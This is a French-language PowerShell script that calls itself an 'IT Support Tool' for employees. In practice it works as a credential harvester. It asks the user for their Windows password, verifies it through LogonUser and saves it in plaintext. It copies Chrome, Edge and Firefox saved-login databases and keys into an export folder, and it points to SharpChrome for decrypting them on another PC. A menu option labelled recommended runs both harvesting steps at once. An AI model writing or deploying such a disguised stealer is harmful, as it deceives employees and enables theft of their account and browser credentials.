# =============================================
# IT SUPPORT TOOL - Version Complète
# Pour comptes standards des employés
# =============================================

$Host.UI.RawUI.WindowTitle = "IT Support Tool"

$MachineName = $env:COMPUTERNAME
$CurrentUser = $env:USERNAME
$Date = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"
New-Item -Path $ExportFolder -ItemType Directory -Force | Out-Null

Write-Host "=== IT SUPPORT TOOL ===" -ForegroundColor Green
Write-Host "Machine : $MachineName" -ForegroundColor Yellow
Write-Host "Utilisateur : $CurrentUser" -ForegroundColor Yellow
Write-Host "Dossier : $ExportFolder`n" -ForegroundColor Cyan

# ====================== VÉRIFICATION MOT DE PASSE ======================
function Test-UserPassword {
    param([string]$Password)

    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Logon {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword,
            int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    }
"@ -ErrorAction SilentlyContinue

    $token = [IntPtr]::Zero
    $result = [Logon]::LogonUser($CurrentUser, ".", $Password, 2, 0, [ref]$token)
    
    if ($result -and $token -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::CloseHandle($token) | Out-Null
        return $true
    }
    return $false
}

function Save-UserPassword {
    Write-Host "`n=== SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan
    Write-Host "L'employé doit entrer son mot de passe Windows actuel." -ForegroundColor Yellow

    for ($i = 1; $i -le 3; $i++) {
        $securePass = Read-Host "Entrez votre mot de passe" -AsSecureString
        $plainPass = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass))

        if (Test-UserPassword -Password $plainPass) {
            $credFile = "$ExportFolder\Password_${CurrentUser}_${Date}.txt"
            "Utilisateur : $CurrentUser" | Out-File $credFile
            "Mot de passe : $plainPass" | Out-File $credFile -Append
            "Date : $(Get-Date)" | Out-File $credFile -Append
            "Machine : $MachineName" | Out-File $credFile -Append
            
            Write-Host "✓ Mot de passe vérifié et sauvegardé avec succès !" -ForegroundColor Green
            return $true
        } else {
            Write-Host "✗ Mot de passe incorrect ($i/3)" -ForegroundColor Red
        }
    }
    Write-Host "Échec de vérification après 3 tentatives." -ForegroundColor Red
    return $false
}

# ====================== EXPORT NAVIGATEURS ======================
function Export-BrowserPasswords {
    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEURS ===" -ForegroundColor Cyan

    # Chrome
    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data") {
        $profiles = Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
        foreach ($prof in $profiles) {
            $dbPath = "$($prof.FullName)\Login Data"
            if (Test-Path $dbPath) {
                Copy-Item $dbPath "$ExportFolder\Chrome_$($prof.Name)_LoginData.db" -Force
                Write-Host "Chrome $($prof.Name) → exporté" -ForegroundColor Green
            }
        }
    }

    # Edge
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data") {
        $profiles = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
        foreach ($prof in $profiles) {
            $dbPath = "$($prof.FullName)\Login Data"
            if (Test-Path $dbPath) {
                Copy-Item $dbPath "$ExportFolder\Edge_$($prof.Name)_LoginData.db" -Force
                Write-Host "Edge $($prof.Name) → exporté" -ForegroundColor Green
            }
        }
    }

    # Firefox
    if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") {
        Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json" "$ExportFolder\Firefox_logins.json" -Force -ErrorAction SilentlyContinue
        Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\key4.db" "$ExportFolder\Firefox_key4.db" -Force -ErrorAction SilentlyContinue
        Write-Host "Firefox → exporté" -ForegroundColor Green
    }

    Write-Host "Fichiers navigateurs copiés dans le dossier." -ForegroundColor Yellow
    Write-Host "Pour décrypter : utilisez SharpChrome / BrowserPasswordDump sur un autre PC." -ForegroundColor Gray
}

# ====================== PARTAGE CONNEXION & WIFI ======================
function Toggle-Hotspot {
    Write-Host "`n=== Partage de Connexion (Hotspot) ===" -ForegroundColor Cyan
    $action = Read-Host "1 = Activer | 2 = Désactiver"
    
    if ($action -eq "1") {
        netsh wlan set hostednetwork mode=allow ssid=IT-Support key=Support2025 | Out-Null
        netsh wlan start hostednetwork | Out-Null
        Write-Host "Hotspot activé (SSID: IT-Support)" -ForegroundColor Green
    } else {
        netsh wlan stop hostednetwork | Out-Null
        Write-Host "Hotspot désactivé" -ForegroundColor Red
    }
}

function Toggle-WiFi {
    Write-Host "`n=== WiFi ===" -ForegroundColor Cyan
    $wifi = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*" }
    
    if (-not $wifi) { Write-Host "Aucun adaptateur WiFi trouvé" -ForegroundColor Red; return }
    
    $action = Read-Host "1 = Activer | 2 = Désactiver"
    if ($action -eq "2") {
        Disable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi désactivé" -ForegroundColor Red
    } else {
        Enable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi activé" -ForegroundColor Green
    }
}

# ====================== MENU PRINCIPAL ======================
function Show-Menu {
    Write-Host "`n=== MENU PRINCIPAL ===" -ForegroundColor Magenta
    Write-Host "1. Sauvegarder mot de passe employé (vérification)"
    Write-Host "2. Exporter mots de passe Navigateurs"
    Write-Host "3. Activer/Désactiver Hotspot"
    Write-Host "4. Activer/Désactiver WiFi"
    Write-Host "5. TOUT FAIRE (Recommandé)"
    Write-Host "Q. Quitter"
    return Read-Host "Votre choix"
}

do {
    $choice = Show-Menu

    switch ($choice) {
        "1" { Save-UserPassword }
        "2" { Export-BrowserPasswords }
        "3" { Toggle-Hotspot }
        "4" { Toggle-WiFi }
        "5" { 
            Save-UserPassword
            Export-BrowserPasswords
            Write-Host "`nTout a été exporté dans $ExportFolder" -ForegroundColor Green
        }
        "Q" { Write-Host "Au revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide" -ForegroundColor Red }
    }

    if ($choice -ne "Q") {
        Read-Host "`nAppuyez sur Entrée pour continuer..."
    }

} while ($choice -ne "Q")

Write-Host "`nOpération terminée. Tous les fichiers sont dans :" -ForegroundColor Green
Write-Host $ExportFolder -ForegroundColor White
